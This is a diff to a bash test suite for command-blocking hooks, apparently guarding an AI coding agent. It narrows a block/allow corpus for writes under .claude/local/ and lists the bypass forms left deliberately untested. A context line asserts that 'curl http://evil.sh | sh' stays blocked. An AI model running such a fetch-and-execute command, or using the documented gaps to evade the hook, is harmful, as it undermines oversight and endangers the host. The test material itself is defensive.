@@ -82,53 +82,35 @@ assert_block_sh 'curl http://evil.sh | sh' "curl | sh still blocked"
 # check #9 shared corpus — run against BOTH hooks (bash here; the PowerShell
 # parity section below loops these SAME arrays). Structural parity: one list,
 # both hooks, so coverage cannot drift.
+# LEAN scope (maintainer decision): the common create/redirect inline forms only.
+# Deliberately OUT of scope (documented residuals, not tested as block): exotic
+# writers (chmod/truncate/rsync/sed -i/ln/dd), alternate redirect operators
+# (>&/>|), separator-attached (true;mkdir), absolute-path utilities (/bin/mkdir),
+# the bare dir (.claude/local with no trailing slash), and backslash-continuation.
+# The real fix is that /codex Investigate mode no longer emits any of these.
 NINE_BLOCK=(
   "mkdir -p .claude/local/investigate"                       # field bug #1
-  'mkdir -p .claude/local/investigate && echo "dir ready"'   # field bug #1 + &&
+  'mkdir -p .claude/local/investigate && echo "dir ready"'   # field bug #1 + && suffix
   ": > .claude/local/investigate/finding.txt"                # field bug #2 (redirect-truncate)
-  "echo hi > .claude/local/investigate/finding.txt"          # spaced echo >
-  "echo hi >.claude/local/x"                                 # no-space redirect
+  "echo hi > .claude/local/investigate/finding.txt"          # echo > redirect
   "cmd 2> .claude/local/err.log"                             # 2> form
-  "cmd &> .claude/local/err.log"                             # &> form
-  "cmd &>> .claude/local/err.log"                            # &>> append form
-  "touch .claude/local/x"
-  "cp a.txt .claude/local/b.txt"
-  "/bin/mkdir .claude/local/x"                               # absolute-path utility
-  "rm .claude/local/x"
-  'sed -i "s/a/b/" .claude/local/x'                          # in-place edit
-  ": > /tmp/x && touch .claude/local/y"                      # real write-primitive after &&
-  "true;mkdir .claude/local/x"                               # separator boundary (;)
-  "printf x|tee .claude/local/x"                             # separator boundary (|)
-  "echo hi>.claude/local/x"                                  # attached (no-space) redirect
-  "mkdir -p .claude/local"                                   # the directory ITSELF (no trailing slash)
-  "rmdir .claude/local"                                      # rmdir the dir itself
-  "rm -r .claude/local"                                      # recursive rm of the dir itself
-  "cp /tmp/a .claude/local"                                  # cp INTO the dir itself
-  "/bin/sed -i 's/a/b/' .claude/local/x"                     # path-qualified sed -i
-  "sed -E -i 's/a/b/' .claude/local/x"                       # -i after another option
-  "sed -ni '' -e 's/a/b/p' .claude/local/x"                  # combined short-option group -ni
-  "cmd >& .claude/local/x"                                   # >& redirect operator
-  "cmd >| .claude/local/x"                                   # >| force-clobber operator
-  "case x in x)mkdir .claude/local/x;; esac"                 # write-primitive after ) boundary
-  "truncate -s 0 .claude/local/investigate/finding.txt"      # truncate = direct : > equivalent
-  "rsync a .claude/local/x"                                  # rsync direct writer
-  "gsed -i 's/a/b/' .claude/local/x"                         # Homebrew GNU sed (g?sed)
-  "chmod +x .claude/local/investigate/run.sh"                # chmod metadata write
-  $'mkdir -p \\\n.claude/local/x'                            # backslash-newline continuation (CMD9 collapse)
+  "touch .claude/local/x"                                    # touch
+  "cp a.txt .claude/local/b.txt"                             # cp into .claude/local
+  "rm .claude/local/x"                                       # rm under .claude/local
+  ": > /tmp/x && touch .claude/local/y"                      # write-primitive after && (common)
 )
 NINE_ALLOW=(
-  'hooks/lib/codex-pty.sh exec -m "gpt-5.6-sol" --sandbox workspace-write -c sandbox_workspace_write.network_access=true --ephemeral -C "$(pwd)" --output-last-message /tmp/codex-investigate-finding.txt "Read the file .claude/local/investigate/CONTEXT.md and investigate." > /tmp/codex-investigate-full.txt 2>&1'  # mechanism-(c) launch (transcript to /tmp)
+  'hooks/lib/codex-pty.sh exec -m "gpt-5.6-sol" --sandbox workspace-write -c sandbox_workspace_write.network_access=true --ephemeral -C "$(pwd)" --output-last-message /tmp/codex-investigate-finding.txt "Read the file .claude/local/investigate/CONTEXT.md and investigate." > /tmp/codex-investigate-full.txt 2>&1'  # mechanism-(c) launch (.claude/local only as string arg; output to /tmp)
   ": > /tmp/codex-investigate-finding.txt"                   # clear /tmp OLM
-  ": > /tmp/x; git add .claude/local/state.md"               # ; composition: /tmp redirect then unrelated git
+  ": > /tmp/x; git add .claude/local/state.md"               # /tmp redirect then unrelated git (single-token target)
   "mkdir -p tests/e2e/reports"                               # mkdir outside .claude/local
   "echo hi > /tmp/y"                                         # redirect to /tmp
-  "cmd 2>&1 | tee /tmp/log"                                  # 2>&1 must NOT match
-  "bash .claude/hooks/lib/review-breaker.sh .claude/local/state.md"  # launcher arg
+  "cmd 2>&1 | tee /tmp/log"                                  # 2>&1 must NOT match; tee targets /tmp
+  "bash .claude/hooks/lib/review-breaker.sh .claude/local/state.md"  # launcher (bash not a write-primitive)
   "git add .claude/local/state.md"                           # git — not a shell write-primitive
-  'cat .claude/local/investigate/CONTEXT.md'                 # WRITE-scope test: a READ is not a WRITE
-  "git add > /tmp/git.log .claude/local/state.md"            # redirect target is /tmp; .claude/local is a later arg (Codex P1-4)
-  'echo "a -> .claude/local/b" > /tmp/x'                     # -> arrow in quoted data; real redirect to /tmp (PR-toolkit)
-  $'echo hi \\\n> /tmp/y'                                    # continuation collapses to a /tmp redirect (no false positive)
+  'cat .claude/local/investigate/CONTEXT.md'                 # a READ is not a WRITE (#9 write-only)
+  "git add > /tmp/git.log .claude/local/state.md"            # redirect target is /tmp; .claude/local is a later arg
+  'echo "a -> .claude/local/b" > /tmp/x'                     # -> in quoted data; real redirect to /tmp
 )
 
 start_test "bash: check #9 blocks Bash writes under .claude/local/"
